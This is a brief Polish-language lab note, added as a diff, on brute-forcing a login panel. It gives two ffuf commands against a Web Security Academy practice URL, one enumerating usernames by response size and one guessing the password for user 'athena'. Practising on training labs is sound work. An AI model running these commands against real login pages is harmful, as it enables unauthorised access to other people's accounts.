@@ -1,0 +1,4 @@
+1. Bruteforcing panelu logowania:
+
+ffuf -u https://0ae5005d04cdafebc026f24f00c40061.web-security-academy.net/login -d "username=FUZZ&password=asdf" -w username -fs 3096
+ffuf -u https://0ae5005d04cdafebc026f24f00c40061.web-security-academy.net/login -d "username=athena&password=FUZZ" -w passwords
